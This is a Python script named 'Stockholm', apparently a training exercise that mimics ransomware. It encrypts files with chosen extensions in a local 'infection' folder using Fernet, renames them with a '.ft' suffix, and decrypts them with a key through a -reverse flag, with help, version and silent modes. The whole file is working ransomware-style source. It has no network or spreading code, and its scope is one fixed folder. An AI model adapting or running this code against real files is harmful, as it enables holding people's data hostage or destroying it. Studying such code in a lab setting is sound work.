#!/usr/bin/python3.9
import sys
from os import listdir, rename
from os.path import split, splitext
from cryptography.fernet import Fernet

folder = "infection"

class bcol:
    GREEN = '\033[2;32m'
    BACKGR = '\033[7m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    CURSI = '\033[3m'
    UNDERLINE = '\033[4m'

def load_list_ext():
    txt_file = open("ext/extensions.txt", "r")
    content = txt_file.read()
    content_list = content.split('\n')
    txt_file.close()
    return content_list

def encrypt_file(extensions, src, k, silence):

    newfile = split(src)
    ext = splitext(newfile[1])
    if ext[1] != "" and ext[1] != None:
        if ext[1] in extensions:
            with open(src, 'rb') as o_file:
                r_file = o_file.read()
                crypt = k.encrypt(r_file)
            with open(src, 'wb') as crypt_file:
                crypt_file.write(crypt)
            if not newfile[1].endswith('.ft'):
                name = newfile[1]
                newname = name + '.ft'
                dst = folder + '/' + newname
                rename(src, dst)
                if silence == False:
                    print(bcol.GREEN + newname + " encripted" + bcol.ENDC)
            else:
                if silence == False:
                    print(bcol.GREEN + newfile[1] + " encripted" + bcol.ENDC)

def decrypt_file(src, k, silence):

    newfile = split(src)
    if newfile[1].endswith('.ft'):
        with open(src, 'rb') as o_file:
            r_file = o_file.read()
            decrypt = k.decrypt(r_file)
            with open(src, 'wb') as crypt_file:
                crypt_file.write(decrypt)
            name =  newfile[1]
            newname = name.replace('.ft', '')
            dst = folder + '/' + newname
            rename(src, dst)
            if silence == False:
                print(bcol.GREEN + name + " decriped as " + newname + bcol.ENDC)

def switch_crypt(extensions, mode, src, k, silence):

    if mode == "rev":
        decrypt_file(src, k, silence)
    else:
        encrypt_file(extensions, src, k, silence)

def check_key(inputkey):

    with open("utils/key.key", "r") as mykey:
            key = mykey.read()
    if not inputkey == key:
        return None
    else:
        return 1

def files_treat(extensions, mode, silence, key):
    
    folder = "infection"
    if key == "":
        with open("utils/key.key", "rb") as mykey:
                key = mykey.read()
    k = Fernet(key)
    for count, filename in enumerate(listdir(folder)):
        src = folder + '/' + filename
        switch_crypt(extensions, mode, src, k, silence)

def call_rev_files(extensions, key, silence):

    mode = "rev"
    if check_key(key) == 1:
        files_treat(extensions, mode, silence, key)
    else:
        print(bcol.FAIL + "ERROR: Invalid syntax or incorrect key.\n" + bcol.ENDC)

def help_messages():

    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *")
    print("")
    print("Stockholm encrypts local files from a specific folder.")
    print("")
    print("There exists flags to interact with the rogram:")
    print(bcol.UNDERLINE)
    print("FLAGS")
    print(bcol.ENDC + "\t[ -help ][ -h ] Shows avaible flags for the program.")
    print("\t[ -reverse ][ -r ] Decrypt files using it along with decryption key [ ./stock.py -reverse + [key] ]")
    print("\t[ -silent ][ -s ] Silences the file de/encryption process. [./stock.py -silent] or " +
        "[./stock.py -silent -reverse + [key] ]")
    print("\t[ -version ][ -v ] Shows program version.")
    print("")
    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *\n")

def version_messages():

    print("")
    print(bcol.CURSI + "Stock(holm) version 1.0")
    print("")
    print("July 2022")
    print(bcol.ENDC)

def many_args_messages():
    print(bcol.FAIL)
    print("[ERROR]" + bcol.ENDC + " Too many arguments.")
    print("Try [ ./stock.py -help ]")
    print("")

def main(argv):

    key = ""
    mode = "crypt"
    lst = load_list_ext()
    if len(argv) > 4:
        many_args_messages()
    elif len(argv) > 1:
        if argv[1] == "-help" or argv[1] == "-h":
            help_messages()
        elif argv[1] == "-version" or argv[1] == "-v":
            version_messages()
        elif argv[1] == "-silent" or argv[1] == "-s":
            if len(argv) == 2:
                files_treat(lst, mode, True, key)
            elif len(argv) == 3:
                print("")
                print(bcol.FAIL + "[ERROR]" + bcol.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?\n")
            elif len(argv) == 4:
                call_rev_files(lst, argv[3], True)
        elif argv[1] == "-reverse" or argv[1] == "-r":
            if len(argv) < 3:
                print("")
                print ("Introducce the key [ -reverse + <key> ]\n")
            elif len(argv) == 4:
                print("")
                print(bcol.FAIL + "[ERROR]" + bcol.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?\n")
            else:
                call_rev_files(lst, argv[2], False)
        else:
            print(bcol.BACKGR)
            print("Unrecognized command")
            print(bcol.ENDC)
    else:
        files_treat(lst, mode, False, key)

if __name__ == '__main__':
    main(sys.argv)
